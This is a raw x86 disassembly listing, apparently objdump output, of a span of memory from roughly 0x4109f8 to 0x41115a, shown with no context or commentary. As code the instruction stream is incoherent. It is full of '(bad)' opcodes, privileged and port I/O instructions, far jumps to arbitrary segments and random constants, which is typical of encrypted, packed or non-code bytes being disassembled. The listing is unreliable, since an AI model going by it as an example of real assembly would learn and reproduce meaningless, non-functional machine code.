  4109f8:	and    eax,DWORD PTR [ebp+0x40]
  4109fb:	imul   ebx,DWORD PTR [ecx],0xffffffd2
  4109fe:	(bad)  
  4109ff:	mov    ebp,0xe0de440e
  410a04:	pushf  
  410a05:	mov    eax,ds:0xaa5fa2ec
  410a0a:	sub    dl,BYTE PTR [ecx]
  410a0c:	push   0x15
  410a0e:	dec    ecx
  410a0f:	adc    ch,BYTE PTR ds:0xd7143586
  410a15:	pop    edx
  410a16:	pop    eax
  410a17:	fsubr  st(7),st
  410a19:	bound  eax,QWORD PTR ds:0xed66122c
  410a1f:	mov    ecx,0x66843ab6
  410a24:	mul    esp
  410a26:	scas   al,BYTE PTR es:[edi]
  410a27:	retf   0x5e28
  410a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a2b:	pop    ds
  410a2c:	call   0xa540:0x90b41fd
  410a33:	scas   al,BYTE PTR es:[edi]
  410a34:	push   edi
  410a35:	lock shl edi,0x8a
  410a39:	adc    al,0xd9
  410a3b:	cli    
  410a3c:	mov    eax,ds:0xbec0eda0
  410a41:	mov    al,ds:0x2bf06a34
  410a46:	jmp    0x1e62:0x95a1376d
  410a4d:	outs   dx,DWORD PTR ds:[esi]
  410a4e:	inc    ebx
  410a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a50:	push   ss
  410a51:	pop    ebp
  410a52:	in     eax,0x3b
  410a54:	jb     0x4109df
  410a56:	mov    edx,0xbc472731
  410a5b:	(bad)
  410a5e:	imul   ebx,DWORD PTR [esi],0x17b604e0
  410a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a65:	int    0x47
  410a67:	push   ebx
  410a68:	call   ebx
  410a6a:	pop    ebp
  410a6b:	xchg   edi,eax
  410a6c:	pop    ebp
  410a6d:	pusha  
  410a6e:	sub    ecx,DWORD PTR [eax-0x7d]
  410a71:	sbb    al,0xb0
  410a73:	inc    esp
  410a74:	dec    edi
  410a75:	hlt    
  410a76:	jl     0x410a22
  410a78:	xchg   edi,eax
  410a79:	retf   0x7747
  410a7c:	add    ah,bh
  410a7e:	scas   al,BYTE PTR es:[edi]
  410a7f:	in     al,0xdd
  410a81:	loopne 0x410a5b
  410a83:	and    edx,DWORD PTR fs:[ebp+0x7d37aa3]
  410a8a:	cmp    BYTE PTR [esi+0x3cbf8a43],dh
  410a90:	pop    es
  410a91:	sbb    al,0x4e
  410a93:	push   ss
  410a94:	retf   0xb787
  410a97:	cmc    
  410a98:	xchg   ebp,eax
  410a99:	clc    
  410a9a:	xchg   edx,eax
  410a9b:	lods   eax,DWORD PTR ds:[esi]
  410a9c:	push   0xfffffff7
  410a9e:	sub    ah,BYTE PTR [edi-0x75]
  410aa1:	sbb    eax,DWORD PTR [eax+0x27]
  410aa4:	or     BYTE PTR [edi+eax*1],cl
  410aa7:	xlat   BYTE PTR ds:[ebx]
  410aa8:	push   es
  410aa9:	(bad)  
  410aaa:	cmp    edi,DWORD PTR [ebx]
  410aac:	mov    esp,0x38c02e2d
  410ab1:	and    al,0xcc
  410ab3:	idiv   DWORD PTR [ebx-0x29]
  410ab6:	mov    esi,0x15eacecd
  410abb:	inc    ebx
  410abd:	rcl    BYTE PTR [edx+0x6a],0x63
  410ac1:	xchg   ecx,eax
  410ac2:	int    0x22
  410ac4:	xor    al,0x7e
  410ac6:	mov    ds:0x38ca3985,eax
  410acb:	adc    DWORD PTR [edi],ebp
  410acd:	xor    dh,bl
  410acf:	sbb    esi,DWORD PTR [ebx-0x39]
  410ad2:	scas   eax,DWORD PTR es:[edi]
  410ad3:	dec    eax
  410ad4:	or     al,0x98
  410ad6:	xor    BYTE PTR [edx-0x68],ah
  410ad9:	dec    ebx
  410ada:	repz shl BYTE PTR [edx-0x36],cl
  410ade:	lods   eax,DWORD PTR ds:[esi]
  410adf:	xor    bl,BYTE PTR [eax+ebx*1+0x2cded126]
  410ae6:	mov    bh,0xfc
  410ae8:	fs loope 0x410b02
  410aeb:	mov    eax,ds:0xad6bc80c
  410af0:	aad    0xd7
  410af2:	(bad)  
  410af4:	in     eax,dx
  410af5:	xor    bl,BYTE PTR [eax+ebx*1+0x1d6f8ca4]
  410afc:	daa    
  410afd:	pop    ebp
  410afe:	jno    0x410aec
  410b00:	loop   0x410b1f
  410b02:	push   edx
  410b03:	loop   0x410ab6
  410b05:	inc    esp
  410b06:	test   eax,0x66852ea
  410b0b:	fucompp 
  410b0d:	xor    eax,0x4c268ce4
  410b12:	xor    al,BYTE PTR [edi+0x24]
  410b15:	lods   al,BYTE PTR ds:[esi]
  410b16:	adc    BYTE PTR [edi+0x1a],ch
  410b19:	ins    BYTE PTR es:[edi],dx
  410b1a:	mov    ah,0xa9
  410b1c:	mov    al,ds:0x6e1cbb80
  410b21:	fisttp WORD PTR [esi]
  410b23:	je     0x410b68
  410b25:	stos   DWORD PTR es:[edi],eax
  410b26:	in     eax,0xa3
  410b28:	xor    DWORD PTR [ebp+0xe01ab20],esi
  410b2e:	sub    al,0xc7
  410b31:	bound  eax,QWORD PTR ds:0x6f5c7824
  410b37:	xchg   ebx,eax
  410b38:	in     al,0x74
  410b3a:	mov    ds:0x94837d21,eax
  410b3f:	sti    
  410b40:	mul    DWORD PTR [edx]
  410b42:	pop    ebx
  410b43:	xor    DWORD PTR [edi+0x73],0xffffff9e
  410b47:	and    ch,BYTE PTR [eax]
  410b49:	cmp    BYTE PTR [edi-0x41],bl
  410b4c:	mov    dl,0xa9
  410b4e:	ror    BYTE PTR [eax+0x7f],0x27
  410b52:	add    dl,ch
  410b54:	mov    cl,0xc
  410b56:	adc    cl,ch
  410b58:	add    BYTE PTR [ecx-0x2d],cl
  410b5b:	js     0x410b7c
  410b5d:	aaa    
  410b5e:	sub    dl,BYTE PTR [ebp+0x63f798a9]
  410b64:	dec    edx
  410b65:	in     al,0x26
  410b67:	fstp   DWORD PTR [ebx-0x3db28a78]
  410b6d:	pusha  
  410b6e:	fdivrp st(2),st
  410b70:	push   ebp
  410b71:	cld    
  410b72:	mov    WORD PTR [edi],?
  410b74:	in     eax,0x9d
  410b76:	loope  0x410b8d
  410b78:	aad    0xed
  410b7a:	cwde   
  410b7b:	dec    esp
  410b7c:	ins    DWORD PTR es:[edi],dx
  410b7d:	stc    
  410b7e:	popa   
  410b7f:	mov    ecx,0x2c4ede36
  410b84:	pop    ss
  410b85:	mov    esp,0xf3ac347a
  410b8a:	popa   
  410b8b:	dec    ebx
  410b8c:	pushf  
  410b8d:	add    eax,0xdc76e779
  410b92:	ret    0xaa77
  410b95:	retf   0x87f9
  410b98:	icebp  
  410b99:	adc    ecx,ebx
  410b9b:	loopne 0x410b7c
  410b9d:	cmp    esi,DWORD PTR [esp+ecx*4]
  410ba0:	push   ebx
  410ba1:	jns    0x410b95
  410ba3:	aad    0xc8
  410ba5:	push   ds
  410ba6:	or     DWORD PTR [eax+ebp*8+0x62fd1348],ebx
  410bad:	xor    ch,BYTE PTR gs:[ebp-0xa7db5c9]
  410bb4:	cld    
  410bb5:	or     al,BYTE PTR [edx]
  410bb7:	mov    dh,0xd5
  410bb9:	cmp    ebx,DWORD PTR [edx]
  410bbb:	aas    
  410bbc:	adc    ebx,DWORD PTR [edi]
  410bbe:	cmc    
  410bbf:	jne    0x410b98
  410bc1:	std    
  410bc2:	and    BYTE PTR [ebp+0x60d83411],ch
  410bc8:	or     ch,BYTE PTR [edx+0x1acdd8a0]
  410bce:	lds    esi,FWORD PTR [edi]
  410bd0:	rol    cl,1
  410bd2:	cld    
  410bd3:	mov    al,ds:0xaf592d02
  410bd8:	push   cs
  410bd9:	or     ebp,esp
  410bdb:	or     eax,0x8e39f19e
  410be0:	int3   
  410be1:	cmp    esp,DWORD PTR [eax+edi*2]
  410be4:	push   0xffffffba
  410be6:	mov    ah,0x92
  410be8:	std    
  410be9:	ja     0x410bb0
  410beb:	xchg   esp,eax
  410bec:	mov    WORD PTR [ebx+0x72b00a3a],ss
  410bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bf3:	inc    ebx
  410bf4:	and    al,BYTE PTR [ebp-0x16]
  410bf7:	dec    ebx
  410bf8:	mov    DWORD PTR [ebp-0x71891d19],edx
  410bfe:	cmp    eax,0xfd6cd15e
  410c03:	sub    ebp,0x18
  410c06:	pop    esp
  410c07:	jp     0x410c82
  410c09:	pusha  
  410c0a:	loopne 0x410c00
  410c0c:	sbb    al,0xd2
  410c0e:	iret   
  410c0f:	in     al,0x29
  410c11:	mov    edi,0x19698ed4
  410c16:	mov    esi,0xb55aef81
  410c1b:	cmp    DWORD PTR [eax],ebx
  410c1d:	lahf   
  410c1e:	outs   dx,DWORD PTR ds:[esi]
  410c1f:	or     al,0xd8
  410c21:	and    al,0xeb
  410c23:	arpl   WORD PTR [ebx-0x6f8b5923],sp
  410c29:	fnsave [ecx-0xce12813]
  410c2f:	jns    0x410bed
  410c31:	loop   0x410c7a
  410c33:	inc    esp
  410c34:	lds    esi,FWORD PTR [ecx]
  410c36:	addr16 inc edx
  410c38:	sub    eax,eax
  410c3a:	pop    eax
  410c3b:	jp     0x410be3
  410c3d:	fucomp st(6)
  410c3f:	sar    DWORD PTR [ebx+0x207d4a27],cl
  410c45:	in     eax,0x54
  410c47:	xor    BYTE PTR [esp+ebp*1-0x1e],ah
  410c4b:	aad    0x9c
  410c4d:	mov    ch,0xc0
  410c4f:	test   BYTE PTR [edi+0x3b],cl
  410c52:	arpl   sp,di
  410c54:	push   esi
  410c55:	cmp    esi,DWORD PTR [edx]
  410c57:	mov    dl,BYTE PTR [esi+edx*2]
  410c5a:	dec    edi
  410c5b:	push   edx
  410c5c:	mov    ch,0xd3
  410c5e:	loope  0x410c84
  410c60:	and    BYTE PTR [ebx],al
  410c62:	cwde   
  410c63:	sti    
  410c64:	or     BYTE PTR [edi-0xb],al
  410c67:	imul   BYTE PTR [esi]
  410c69:	adc    BYTE PTR [ecx],bh
  410c6b:	ins    DWORD PTR es:[edi],dx
  410c6c:	mov    dh,0x47
  410c6e:	stos   BYTE PTR es:[edi],al
  410c6f:	int    0x5
  410c71:	dec    edi
  410c72:	cdq    
  410c73:	xchg   edi,eax
  410c74:	scas   al,BYTE PTR es:[edi]
  410c75:	stc    
  410c76:	cmp    bl,ah
  410c78:	jmp    0x81fa:0xfcb203b3
  410c7f:	push   esp
  410c80:	dec    edi
  410c81:	or     DWORD PTR [esi],esi
  410c83:	call   0x8d997330
  410c88:	jns    0x410c30
  410c8a:	(bad)  
  410c8b:	xchg   BYTE PTR [ebx+0x5eb83af1],bh
  410c91:	in     eax,0x29
  410c93:	pushf  
  410c94:	mov    ah,0x53
  410c96:	ret    
  410c97:	xchg   BYTE PTR [ebx+0x0],bl
  410c9a:	scas   eax,DWORD PTR es:[edi]
  410c9b:	mov    bl,0xb5
  410c9d:	sti    
  410c9e:	in     eax,0xa7
  410ca0:	out    dx,eax
  410ca1:	jecxz  0x410d1e
  410ca3:	lods   al,BYTE PTR ds:[esi]
  410ca4:	inc    ebp
  410ca5:	lods   eax,DWORD PTR ds:[esi]
  410ca6:	fstp   QWORD PTR [ecx+0x5e66badf]
  410cac:	sbb    edx,DWORD PTR [esi-0x2]
  410caf:	fidivr DWORD PTR [edi]
  410cb1:	in     eax,dx
  410cb2:	inc    eax
  410cb3:	lods   al,BYTE PTR ds:[esi]
  410cb4:	mov    esp,0xa3d500e7
  410cb9:	mov    esi,0xb98c431
  410cbe:	add    DWORD PTR [ebx-0x3f5e5389],0x14
  410cc5:	or     dh,BYTE PTR [ecx]
  410cc7:	adc    al,0xb7
  410cc9:	int    0xa8
  410ccb:	fs sti 
  410ccd:	in     al,dx
  410cce:	sbb    DWORD PTR [ebp+0x7c],0xffffffbe
  410cd2:	inc    edi
  410cd3:	imul   edx,DWORD PTR [eax+0x1f],0x1e
  410cd7:	and    DWORD PTR ds:[eax+0x47],ebx
  410cdb:	test   DWORD PTR [edx+0x22a76338],eax
  410ce1:	nop
  410ce2:	int3   
  410ce3:	(bad)  
  410ce4:	std    
  410ce5:	add    DWORD PTR [edx-0x6a],eax
  410ce8:	jb     0x410cf6
  410cea:	sbb    esp,DWORD PTR [ecx]
  410cec:	dec    edi
  410ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cee:	sub    al,BYTE PTR [ebx]
  410cf0:	push   ecx
  410cf1:	push   ebp
  410cf2:	mov    esi,0x79f4e323
  410cf7:	or     BYTE PTR [ebx],ch
  410cf9:	gs inc ebp
  410cfb:	add    esp,DWORD PTR [ecx-0x609a4663]
  410d01:	scas   eax,DWORD PTR es:[edi]
  410d02:	pop    ecx
  410d03:	outs   dx,DWORD PTR ds:[esi]
  410d04:	push   ss
  410d05:	add    BYTE PTR [ebx+ebp*8-0x126abbb8],ch
  410d0c:	cmp    BYTE PTR [eax],ah
  410d0e:	daa    
  410d0f:	cmp    eax,0x98ba0968
  410d14:	daa    
  410d15:	cli    
  410d16:	and    DWORD PTR ds:0x61f611bb,0xcadda45f
  410d20:	xchg   ecx,eax
  410d21:	jnp    0x410d75
  410d23:	jg     0x410d85
  410d25:	test   eax,0x2b53512e
  410d2a:	xlat   BYTE PTR ds:[ebx]
  410d2b:	sbb    ebp,DWORD PTR [di+0x131e]
  410d30:	ret    0x7ad2
  410d33:	std    
  410d34:	cdq    
  410d35:	aam    0x1c
  410d37:	dec    edx
  410d38:	in     al,0xff
  410d3a:	aam    0xcf
  410d3c:	test   BYTE PTR [ebx-0x4d],dh
  410d3f:	lock lods al,BYTE PTR ds:[esi]
  410d41:	std    
  410d42:	adc    eax,0x2d93a529
  410d47:	ret    
  410d48:	iret   
  410d49:	cmp    ah,BYTE PTR [ecx-0x77]
  410d4c:	mov    ds:0x4d47d9b2,eax
  410d51:	ss hlt 
  410d53:	ins    DWORD PTR es:[edi],dx
  410d54:	icebp  
  410d55:	loop   0x410dbf
  410d57:	lock popf 
  410d59:	xchg   ebp,eax
  410d5a:	test   eax,0x47cca409
  410d5f:	in     al,dx
  410d60:	cmp    BYTE PTR [edx-0x7dfd63fb],0xb3
  410d67:	jno    0x410cfc
  410d69:	adc    cl,BYTE PTR [eax]
  410d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d6c:	sub    DWORD PTR [ebx],edi
  410d6e:	test   DWORD PTR ss:0x25f9b7a9,edx
  410d75:	enter  0xefd8,0x36
  410d79:	ror    BYTE PTR [edx+esi*4-0x72],0x9e
  410d7e:	and    DWORD PTR [esi+ebp*4+0x1c2c5d8c],esp
  410d85:	cmp    al,0xc0
  410d87:	scas   al,BYTE PTR es:[edi]
  410d88:	add    BYTE PTR [edi],ah
  410d8a:	lods   eax,DWORD PTR ds:[esi]
  410d8b:	das    
  410d8c:	outs   dx,BYTE PTR ds:[esi]
  410d8d:	out    0xa1,al
  410d8f:	std    
  410d90:	jmp    0x734e0569
  410d95:	mov    WORD PTR [edx],gs
  410d97:	daa    
  410d98:	sbb    eax,0xdfef5689
  410d9d:	mov    ebx,0x777886cf
  410da2:	inc    eax
  410da3:	sti    
  410da4:	(bad)  
  410da5:	push   cs
  410da6:	in     eax,0xf
  410da8:	cmp    DWORD PTR [edi+0x4f9c78ca],edi
  410dae:	les    edx,FWORD PTR [esi-0x64]
  410db1:	dec    edi
  410db2:	(bad)  
  410db3:	or     dh,BYTE PTR [eax+0x4a]
  410db6:	ret    0x5b34
  410db9:	(bad)  
  410dba:	mov    bh,0x81
  410dbc:	fcmovb st,st(5)
  410dbe:	jmp    0x410df6
  410dc0:	add    DWORD PTR [esp+edx*1],ebx
  410dc3:	arpl   cx,dx
  410dc5:	stos   DWORD PTR es:[edi],eax
  410dc6:	or     DWORD PTR [edx+0xe],edi
  410dc9:	clc    
  410dca:	sbb    cl,cl
  410dcc:	xchg   esi,eax
  410dcd:	xchg   ebx,eax
  410dce:	xchg   DWORD PTR [ecx],edi
  410dd0:	retf   
  410dd1:	jbe    0x410d6b
  410dd3:	gs aas 
  410dd5:	pop    ecx
  410dd6:	out    dx,al
  410dd7:	out    0x2,al
  410dd9:	es mov cl,0xb2
  410ddc:	jmp    0x1ff0:0x841e4813
  410de3:	push   0x3eeb5388
  410de8:	ds push edi
  410dea:	hlt    
  410deb:	int3   
  410dec:	std    
  410ded:	iret   
  410dee:	cld    
  410def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410df0:	xchg   ecx,eax
  410df1:	shl    DWORD PTR [ebp-0x33],1
  410df4:	pop    eax
  410df5:	add    bl,dl
  410df7:	fstp   st(7)
  410df9:	lods   al,BYTE PTR ds:[esi]
  410dfa:	push   ecx
  410dfb:	mov    edi,?
  410dfd:	jmp    0xbf4f:0x4d34b001
  410e04:	and    DWORD PTR [eax+eiz*1-0x38],edi
  410e08:	xor    eax,0xe0a3b315
  410e0d:	pusha  
  410e0e:	push   ebx
  410e0f:	inc    edx
  410e10:	lahf   
  410e11:	shl    DWORD PTR [ebx+0x57c3c9bd],cl
  410e17:	adc    BYTE PTR [eax-0x6a],ch
  410e1a:	dec    edi
  410e1b:	xchg   ecx,eax
  410e1c:	pop    esi
  410e1d:	pop    ds
  410e1e:	push   0x11
  410e20:	jae    0x410dcb
  410e22:	xchg   esi,eax
  410e23:	jecxz  0x410e2a
  410e25:	dec    edi
  410e26:	retf   0x219c
  410e29:	pop    ss
  410e2a:	inc    eax
  410e2b:	or     dh,BYTE PTR [ebp-0x4ba73fef]
  410e31:	pop    eax
  410e32:	hlt    
  410e33:	(bad)  
  410e34:	sub    al,0x40
  410e36:	sub    esi,0x3b1dfeab
  410e3c:	fwait
  410e3d:	or     al,0xf8
  410e3f:	fiadd  DWORD PTR [eax+ebx*2]
  410e42:	cmp    BYTE PTR [edi+0x4f],ah
  410e45:	lods   eax,DWORD PTR ds:[esi]
  410e46:	mov    edx,0xf46be32
  410e4b:	imul   edi,DWORD PTR [edi],0x54fa0084
  410e51:	ins    BYTE PTR es:[edi],dx
  410e52:	and    eax,0x8124f16a
  410e57:	or     eax,0xa357ab34
  410e5c:	popf   
  410e5d:	dec    eax
  410e5e:	or     al,0xce
  410e60:	jle    0x410eab
  410e62:	and    edx,DWORD PTR [ecx-0x18]
  410e65:	add    eax,DWORD PTR ds:0xf8ad51f7
  410e6b:	mov    esi,0x38b24020
  410e70:	mov    ah,0x16
  410e72:	je     0x410ea9
  410e74:	xor    dl,dl
  410e76:	dec    eax
  410e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e78:	ret    
  410e79:	inc    edi
  410e7a:	jns    0x410e4c
  410e7c:	test   DWORD PTR [edx],0x4ed59be9
  410e82:	add    ebp,edx
  410e84:	mov    esi,0xc9223ca9
  410e89:	and    BYTE PTR [esi-0x74fc7844],bh
  410e8f:	fistp  DWORD PTR [ebp-0x20f51ee5]
  410e95:	jne    0x410eb0
  410e97:	sahf   
  410e98:	mov    al,dh
  410e9a:	fs pop es
  410e9c:	sbb    ecx,edi
  410e9e:	adc    eax,ecx
  410ea0:	add    DWORD PTR [eax-0x1d],ebx
  410ea3:	or     ch,dl
  410ea5:	and    WORD PTR [edx-0xa],ax
  410ea9:	mov    esp,0x550f75e1
  410eae:	pusha  
  410eaf:	adc    eax,0xdc33bcc2
  410eb4:	inc    esp
  410eb5:	dec    esp
  410eb6:	push   edi
  410eb7:	xchg   esi,eax
  410eb8:	js     0x410ee5
  410eba:	fwait
  410ebb:	xor    bh,BYTE PTR [ebx+0x5b]
  410ebe:	in     al,dx
  410ebf:	sbb    bl,cl
  410ec1:	not    BYTE PTR [eax]
  410ec3:	xor    al,0xaa
  410ec5:	and    DWORD PTR [ecx-0x4e],esp
  410ec8:	leave  
  410ec9:	out    0xac,eax
  410ecb:	scas   eax,DWORD PTR es:[edi]
  410ecc:	mov    cl,0x93
  410ece:	retf   0xb8be
  410ed1:	add    eax,0x3fb3e2d9
  410ed6:	pusha  
  410ed7:	or     ch,BYTE PTR [esi]
  410ed9:	popa   
  410eda:	inc    edx
  410edb:	rcr    BYTE PTR [eax-0xa52218d],1
  410ee1:	inc    esi
  410ee2:	dec    esp
  410ee3:	sub    al,0x6d
  410ee5:	xchg   ecx,eax
  410ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee7:	in     al,0x67
  410ee9:	pop    ecx
  410eea:	inc    ebp
  410eeb:	jbe    0x410f5b
  410eed:	xlat   BYTE PTR ds:[ebx]
  410eee:	dec    edi
  410eef:	fistp  QWORD PTR [eax-0x1cc62ea6]
  410ef5:	rcl    DWORD PTR [edx+0x259886c4],0x8f
  410efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410efd:	push   edi
  410efe:	fistp  DWORD PTR ds:0x3a020523
  410f04:	lods   eax,DWORD PTR ds:[esi]
  410f05:	fistp  DWORD PTR [ecx+0x22]
  410f08:	push   es
  410f09:	mov    dl,0xd
  410f0b:	and    ebx,ebx
  410f0d:	cmc    
  410f0e:	pusha  
  410f0f:	mov    esp,0xf1e526a6
  410f14:	repz jle 0x410f3b
  410f17:	sbb    dh,BYTE PTR [edi+0x3f]
  410f1a:	cmc    
  410f1b:	inc    esi
  410f1c:	loope  0x410f8d
  410f1e:	xor    DWORD PTR [ecx+eax*1-0x2f7dbfd1],esi
  410f25:	and    bl,ch
  410f27:	add    dh,BYTE PTR [ecx-0xb5d0011]
  410f2d:	int3   
  410f2e:	arpl   WORD PTR [ecx],sp
  410f30:	pusha  
  410f31:	mov    eax,0xfbba2dd6
  410f36:	xor    al,0x1b
  410f38:	lock push ebx
  410f3a:	loop   0x410f44
  410f3c:	cwde   
  410f3d:	sub    dl,ah
  410f3f:	or     edi,DWORD PTR [ebx-0x39857dc]
  410f45:	pop    ds
  410f46:	mov    ds:0xd73c8a9e,al
  410f4b:	ror    BYTE PTR [eax+0x746aaeac],cl
  410f51:	fbstp  TBYTE PTR gs:[esp+ebx*8+0x38]
  410f56:	xchg   edx,eax
  410f57:	jns    0x410fc2
  410f59:	dec    esp
  410f5a:	xor    bl,BYTE PTR [eax+eiz*2+0x60cdfe32]
  410f61:	or     al,0x99
  410f63:	ins    BYTE PTR es:[edi],dx
  410f64:	add    BYTE PTR [edx],ah
  410f66:	dec    ebp
  410f67:	test   BYTE PTR [edx+eiz*4],ah
  410f6a:	aad    0x48
  410f6c:	xchg   esi,eax
  410f6d:	adc    al,0x2a
  410f6f:	iret   
  410f70:	or     ch,bl
  410f72:	test   eax,0xdeb24943
  410f77:	sbb    al,0x6f
  410f79:	popf   
  410f7a:	in     al,dx
  410f7b:	dec    ebp
  410f7c:	jns    0x410f40
  410f7e:	(bad)
  410f83:	mov    ah,0x40
  410f85:	and    al,0x62
  410f87:	pop    es
  410f88:	push   edi
  410f89:	mov    bl,0x98
  410f8b:	sar    DWORD PTR [esi],1
  410f8d:	test   BYTE PTR [ecx-0x7],0xf
  410f91:	add    ch,bh
  410f93:	push   edx
  410f94:	mov    edx,0xacaea5
  410f99:	dec    esi
  410f9a:	sbb    ah,al
  410f9c:	xor    dh,BYTE PTR [eax+eiz*4-0x1]
  410fa0:	jmp    0xf509:0x6fec6de5
  410fa7:	popf   
  410fa8:	aam    0x62
  410faa:	and    al,BYTE PTR [edx]
  410fac:	rcr    BYTE PTR [edx-0xb6d1fe],cl
  410fb2:	fcomp  DWORD PTR [ebp-0x7379c98f]
  410fb8:	jne    0x410fab
  410fba:	xchg   esi,eax
  410fbb:	push   esi
  410fbc:	test   BYTE PTR [esi],dl
  410fbe:	pop    esp
  410fbf:	cmp    al,BYTE PTR [eax]
  410fc1:	adc    DWORD PTR [ecx],eax
  410fc3:	mov    esp,DWORD PTR [edi-0x2006471]
  410fc9:	in     al,dx
  410fca:	jne    0x410f79
  410fcc:	inc    ecx
  410fcd:	push   edx
  410fce:	fucom  st(7)
  410fd0:	inc    edx
  410fd1:	sahf   
  410fd2:	mov    ds:0xbfc8410,eax
  410fd7:	push   dx
  410fd9:	sahf   
  410fda:	add    DWORD PTR [edx],esp
  410fdc:	jp     0x410f71
  410fde:	xchg   ecx,eax
  410fdf:	in     eax,dx
  410fe0:	push   ebx
  410fe1:	iret   
  410fe2:	xor    al,0xa9
  410fe4:	cmp    al,0xdd
  410fe6:	inc    edx
  410fe7:	scas   eax,DWORD PTR es:[edi]
  410fe8:	xor    DWORD PTR [esi+0x67],edx
  410feb:	fidiv  DWORD PTR [eax-0x74e9b86c]
  410ff1:	jae    0x411058
  410ff3:	push   ecx
  410ff4:	imul   ebp,DWORD PTR [esi-0x5dbaf0fc],0x307d46d
  410ffe:	jg     0x410fc0
  411000:	push   eax
  411001:	adc    bh,BYTE PTR [edx+0x53]
  411004:	in     eax,0x5a
  411006:	mov    dl,0x9
  411008:	jo     0x410fa6
  41100a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41100b:	mov    bl,0x10
  41100d:	jo     0x410f9d
  41100f:	mov    esi,0xc4761ceb
  411014:	hlt    
  411015:	jle    0x410ff1
  411017:	sub    BYTE PTR [esi+0x1],dl
  41101a:	mov    edi,0x918a1277
  41101f:	stos   BYTE PTR es:[edi],al
  411020:	xchg   edi,eax
  411021:	outs   dx,BYTE PTR ds:[esi]
  411022:	or     eax,0xec331187
  411027:	bound  ebx,QWORD PTR [ebx+0x56]
  41102a:	xlat   BYTE PTR ds:[ebx]
  41102b:	es or  eax,0xd26f6e20
  411031:	rcl    DWORD PTR [ebx+0x35],cl
  411034:	(bad)  
  411035:	aas    
  411036:	mov    ds:0x57d1300c,al
  41103b:	xchg   ebx,eax
  41103c:	test   eax,0xa330d2fe
  411041:	shl    BYTE PTR [ebp+0x3c7c8c78],cl
  411047:	dec    ebp
  411048:	dec    edi
  411049:	mov    edx,0x5d950bd5
  41104e:	jmp    0x3dfd3739
  411053:	in     eax,0x7c
  411055:	inc    edi
  411056:	dec    esp
  411057:	test   al,0x1b
  411059:	fstp   TBYTE PTR [ebx-0x2416f7fe]
  41105f:	pop    eax
  411060:	xchg   DWORD PTR [eax+0x393f5be8],eax
  411066:	sbb    BYTE PTR [esi-0x6c9d6299],cl
  41106c:	push   cs
  41106d:	ret    
  41106e:	push   esp
  41106f:	cmp    eax,0x61486bb3
  411074:	int3   
  411075:	pop    es
  411076:	stos   BYTE PTR es:[edi],al
  411077:	popf   
  411078:	sub    al,BYTE PTR [ecx+0x1ad9024a]
  41107e:	aad    0xf0
  411080:	ins    BYTE PTR es:[edi],dx
  411081:	dec    eax
  411082:	les    esi,FWORD PTR [edi+0x5f4377d2]
  411088:	int    0xb0
  41108a:	mov    bl,0xb4
  41108c:	mov    bl,0x76
  41108e:	sub    ecx,edi
  411090:	push   ebx
  411091:	aam    0x95
  411093:	(bad)  
  411094:	mov    ah,0xf7
  411096:	push   esi
  411097:	jge    0x4110d3
  411099:	ret    
  41109a:	xchg   esp,eax
  41109b:	or     eax,0xe12d3696
  4110a0:	inc    edx
  4110a1:	test   BYTE PTR [eax-0x36fad23a],dh
  4110a7:	repnz push edx
  4110a9:	call   0x330e88bb
  4110ae:	frstor [ebp+ebx*1-0x1d6ff968]
  4110b5:	(bad)  
  4110b6:	mov    bh,BYTE PTR [edx]
  4110b8:	bound  esi,QWORD PTR [ecx-0x3f]
  4110bb:	mov    ecx,DWORD PTR [edx+0x2f]
  4110be:	adc    ecx,edi
  4110c0:	adc    eax,esp
  4110c2:	arpl   WORD PTR [ebx+eiz*1-0x76],sp
  4110c6:	sub    ebp,DWORD PTR [eax-0x143d2a71]
  4110cc:	xlat   BYTE PTR ds:[ebx]
  4110cd:	mov    bl,BYTE PTR [esi+0xfad3ccd]
  4110d3:	mov    cl,0x23
  4110d5:	mov    eax,ds:0x6f3cf604
  4110da:	lods   al,BYTE PTR ds:[esi]
  4110db:	gs cs mov bh,0x2
  4110df:	in     eax,dx
  4110e0:	mov    BYTE PTR [esp+edx*4+0x74],dl
  4110e4:	inc    ebp
  4110e5:	jmp    0x4110ec
  4110e7:	or     BYTE PTR [ecx-0x5b],ch
  4110ea:	xchg   ebp,eax
  4110eb:	les    eax,FWORD PTR [eax+0x4c]
  4110ee:	std    
  4110ef:	mov    eax,0xbd9ad0ea
  4110f4:	xchg   ebp,eax
  4110f5:	int3   
  4110f6:	aaa    
  4110f7:	mov    WORD PTR [edx+0x52],fs
  4110fa:	push   edx
  4110fb:	add    DWORD PTR [edx],0x4dfab994
  411101:	jno    0x41113e
  411103:	cmp    al,0x5c
  411105:	mov    esi,0x276d42de
  41110a:	dec    ecx
  41110b:	loopne 0x411185
  41110d:	enter  0xb6c8,0xbf
  411111:	sub    al,0x9
  411113:	dec    esi
  411114:	cmp    al,0x9c
  411116:	std    
  411117:	ins    DWORD PTR es:[edi],dx
  411118:	cmp    ecx,DWORD PTR [esi]
  41111a:	push   edx
  41111b:	pop    edi
  41111c:	arpl   WORD PTR [edi+0x74],ax
  41111f:	mov    WORD PTR [edx],?
  411121:	aam    0x7c
  411123:	ret    0x751e
  411126:	push   ebx
  411127:	xor    eax,0x77085324
  41112c:	or     al,0xe2
  41112e:	mov    cl,0x27
  411130:	pop    edx
  411131:	xor    BYTE PTR [esp+ecx*1+0x42],0xbc
  411136:	sbb    ebp,edx
  411138:	ret    
  411139:	repz dec edx
  41113b:	nop
  41113c:	pop    edi
  41113d:	daa    
  41113e:	daa    
  41113f:	inc    esp
  411140:	mov    ds:0x5b2170e5,eax
  411145:	popf   
  411146:	aad    0xba
  411148:	mov    ch,0x5a
  41114a:	dec    ecx
  41114b:	adc    ch,BYTE PTR [edi]
  41114d:	sbb    DWORD PTR [ebp+0x746ae598],ebx
  411153:	push   ss
  411154:	loope  0x41116c
  411156:	dec    ebx
  411157:	inc    edx
  411158:	add    al,0xb6
  41115a:	push   edi
